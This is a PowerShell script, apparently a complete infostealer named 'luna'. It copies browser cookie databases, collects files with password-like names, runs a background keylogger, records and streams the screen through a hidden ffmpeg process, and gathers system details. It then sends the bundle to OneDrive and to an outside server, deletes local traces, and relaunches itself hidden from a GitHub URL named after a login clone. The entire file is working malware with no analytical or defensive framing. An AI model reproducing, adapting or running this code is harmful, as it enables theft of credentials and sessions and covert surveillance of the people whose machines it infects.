# luna.ps1 - PowerShell Agent with Cookie, File Collection, Media Capture, and Keylogging

$serverUrl = "https://onclick-back.onrender.com"
$tempDir = "$env:TEMP\luna"
$shotsDir = "$tempDir\shots"
$logPath = "$tempDir\log.json"
$metaPath = "$tempDir\meta.txt"
$zipPath = "$tempDir\bundle.zip"
$cookieDir = "$tempDir\cookies"
$fileDumpDir = "$tempDir\files"
$keylogPath = "$tempDir\keylog.txt"
$interval = 600  # 10 minutes per cycle

New-Item -ItemType Directory -Force -Path $tempDir, $shotsDir, $cookieDir    | Out-Null

Start-Transcript -Path "$tempDir\session.log" -Append
Write-Output "[*] Started at $(Get-Date)"

function Find-Cookies {
    param ([string]$base, [string]$prefix)

    if (-not (Test-Path $base)) { return }

    Get-ChildItem -Path $base -Recurse -Include "Cookies" -File -ErrorAction SilentlyContinue |
        ForEach-Object {
            $target = "$cookieDir\$prefix$($_.FullName -replace '[\\/:*?"<>|]', '_')"
            try {
                Copy-Item $_.FullName $target -Force -ErrorAction SilentlyContinue
                Write-Output "Copied cookie file: $($_.FullName)"
            } catch {
                Write-Warning "Failed to copy cookie file: $($_.FullName)"
                Where-Object { $_.Length -gt 1024 }
            }
        }
}

function Get-ChromeLikeCookies {
    $targets = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
        "$env:LOCALAPPDATA\Opera Software\Opera Stable"
    )
    foreach ($path in $targets) {
        Find-Cookies -base $path -prefix ([IO.Path]::GetFileName($path) + "_")
    }
}
function Get-FirefoxCookies {
    $base = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (-not (Test-Path $base)) { return }

    Get-ChildItem -Path $base -Directory | ForEach-Object {
        $cookieFile = Join-Path $_.FullName "cookies.sqlite"
        if (Test-Path $cookieFile) {
            $name = "firefox_$($_.Name).sqlite"
            Copy-Item $cookieFile "$cookieDir\$name" -Force -ErrorAction SilentlyContinue
            Write-Output "Copied Firefox cookies: $name"
            Where-Object { $_.Length -gt 1024 }
        }
    }
}


function Scan-Files {
    $targets = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
    $patterns = @("*pass*", "*haslo*", "*secret*", "*login*")
    $extensions = @("*.txt", "*.doc", "*.docx", "*.pdf")
    if (-not (Test-Path $fileDumpDir)) {
    New-Item -ItemType Directory -Path $fileDumpDir -Force | Out-Null
    }

    foreach ($dir in $targets) {
        foreach ($ext in $extensions) {
            foreach ($pattern in $patterns) {
                Get-ChildItem -Path $dir -Recurse -Filter $ext -ErrorAction SilentlyContinue | Where-Object {
                    $_.Name -like $pattern
                } | ForEach-Object {
                    $dest = Join-Path $fileDumpDir $_.Name
                    Copy-Item $_.FullName $dest -Force -ErrorAction SilentlyContinue
                }
            }
        }
    }
}

function Get-SystemReport {
    try {
        $os = Get-WmiObject Win32_OperatingSystem
        $cpu = Get-WmiObject Win32_Processor
        $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 -Property Name, Id, CPU
        $net = Get-NetTCPConnection -ErrorAction SilentlyContinue | Select-Object -First 10

        return [PSCustomObject]@{
            user = $env:USERNAME
            host = $env:COMPUTERNAME
            os = $os.Caption
            version = $os.Version
            arch = $env:PROCESSOR_ARCHITECTURE
            cpu = $cpu.Name
            timestamp = Get-Date -Format o
            processes = $procs
            net = $net
        }
    } catch {
        Write-Warning "Get-SystemReport failed: $_"
        return $null
    }
}
"" | Out-File -Encoding utf8 -Force $keylogPath
Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -TypeDefinition '
    using System;
    using System.Runtime.InteropServices;
    public class KeyLogger {
        [DllImport("User32.dll")]
        public static extern short GetAsyncKeyState(Int32 vKey);
    }'

    $map = @{
        8 = "[Back]"
        13 = "[Enter]"
        32 = " "
        27 = "[Esc]"
        9 = "[Tab]"
    }

    $logPath = "$env:TEMP\luna\keylog.txt"
    while ($true) {
        for ($i = 1; $i -le 255; $i++) {
            if ([KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
                $char = try {
                    if ($map.ContainsKey($i)) { $map[$i] } else { [char]$i }
                } catch { "[?]" }
                Add-Content -Path $logPath -Value "$([DateTime]::Now.ToString('HH:mm:ss')) $char"
            }
        }
        Start-Sleep -Milliseconds 50
    }
}
function Start-Recording {
    param([string]$Mode = "record")
    $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
    if (!(Test-Path $ffmpeg)) { Write-Warning "ffmpeg not found"; return }

    if ($Mode -eq "record") {
        $output = "$tempDir\screen_capture.mp4"
        $args = "-y -f gdigrab -framerate 15 -i desktop -t 00:01:00 -vcodec libx264 `"$output`""
        $proc = Start-Process -FilePath $ffmpeg -ArgumentList $args -WindowStyle Hidden -PassThru
        $proc.WaitForExit()
    } elseif ($Mode -eq "stream") {
        Start-Process -FilePath $ffmpeg -ArgumentList "-f gdigrab -i desktop -f flv rtmp://a.rtmp.youtube.com/live2/YOURKEY" -WindowStyle Hidden
    }
}
function Archive-And-Upload {
    if (-not (Test-Path $keylogPath)) {
        "" | Out-File -Encoding utf8 -Force $keylogPath
    }
    if (-not (Test-Path $keylogPath)) {
        New-Item -ItemType File -Path $keylogPath -Force | Out-Null
    }

    try {
        $report = Get-SystemReport
        if (-not $report) {
            Write-Warning "Report is null, skipping Telegram"
            return
        }
    try {
        $report | ConvertTo-Json -Depth 5 | Out-File $logPath -Force -Encoding utf8
    } catch {
        Write-Warning "ConvertTo-Json failed: $_"
    }

        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $user = $env:USERNAME
        $finalZip = "$tempDir\luna_${user}_$timestamp.zip"
        $meta = "$tempDir\info.txt"

        $filesCount = (Get-ChildItem "$fileDumpDir" -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
        $cookieCount = (Get-ChildItem "$cookieDir" -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count

        @"
System: $($report.user)@$($report.host)
Date: $timestamp
Files: $filesCount
Cookies: $cookieCount
"@ | Set-Content -Path $meta

        $paths = @($logPath, $meta, "$cookieDir\*", "$fileDumpDir\*", $keylogPath)
        if (Test-Path "$tempDir\screen_capture.mp4") {
            $paths += "$tempDir\screen_capture.mp4"
        }

        Start-Sleep -Seconds 2
        Compress-Archive -Path $paths -DestinationPath $finalZip -Force -Verbose

        Upload-To-OneDrive -ZipPath $finalZip -UserName $user -Timestamp $timestamp
        $report | ConvertTo-Json -Depth 5 | Out-File "$tempDir\report_debug.json"
        Send-Telegram -Report $report -FilesCount $filesCount -CookiesCount $cookieCount
    } catch {
        Write-Warning "Report empty, telegram skipped: $_"
    }
}

function Upload-To-OneDrive {
    param(
        [string]$ZipPath,
        [string]$UserName,
        [string]$Timestamp
    )

    $rcloneExe = "$PSScriptRoot\rclone.exe"
    $rcloneConf = "$PSScriptRoot\rclone.conf"
    $remoteFolder = "onedrive:luna_uploads/$UserName/$Timestamp/"

    if (!(Test-Path $rcloneExe) -or !(Test-Path $rcloneConf)) {
        Write-Warning "rclone or config missing"
        return
    }

    & "$rcloneExe" copy "$ZipPath" "$remoteFolder" --config "$rcloneConf" --create-empty-src-dirs --quiet

    if ($LASTEXITCODE -eq 0) {
        Write-Output "Upload successful"
    } else {
        Write-Warning "rclone upload failed with code $LASTEXITCODE"
    }
}
function Send-Telegram {
    param(
        [PSCustomObject]$Report,
        [string]$FilesCount,
        [string]$CookiesCount
    )

    if (-not $Report) {
        Write-Warning "No report data to send"
        return
    }

    $text = @"
PowerShell Identity Report
----------------------
User: $($Report.user)
Machine: $($Report.host)
OS: $($Report.os) $($Report.version)
Arch: $($Report.arch)
CPU: $($Report.cpu)
Time: $($Report.timestamp)

Files: $FilesCount
Cookies: $CookiesCount
----------------------
"@

    try {
        Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body (@{ text = $text } | ConvertTo-Json -Compress) -ContentType "application/json"
    } catch {
        Write-Warning "Telegram send failed: $_"
    }
}

function Cleanup {
    try {
        Remove-Item "$tempDir\*" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Output "Temp cleaned"
    } catch {
        Write-Warning "Cleanup failed"
    }
}

# === MAIN LOOP ===
while ($true) {
    Get-ChromeLikeCookies
    Get-FirefoxCookies
    Scan-Files

    if (-not (Test-Path $fileDumpDir)) {
        New-Item -ItemType Directory -Path $fileDumpDir -Force | Out-Null
    }

    Start-Recording -Mode "record"
    Start-Recording -Mode "stream"

    Archive-And-Upload
    Cleanup

    function Self-Update {
        $url = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna/luna.ps1"
        $local = "$PSScriptRoot\luna.ps1"
        try {
            Invoke-WebRequest -Uri $url -OutFile $local -UseBasicParsing
            Write-Output "Self-update complete"
            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$local`"" -WindowStyle Hidden
            exit
        } catch {
            Write-Warning "Self-update failed: $_"
        }
    }


    Self-Update
    Write-Output "Restarting after update..."
    Start-Process -FilePath "$local" -WindowStyle Hidden
    exit
}


Stop-Transcript
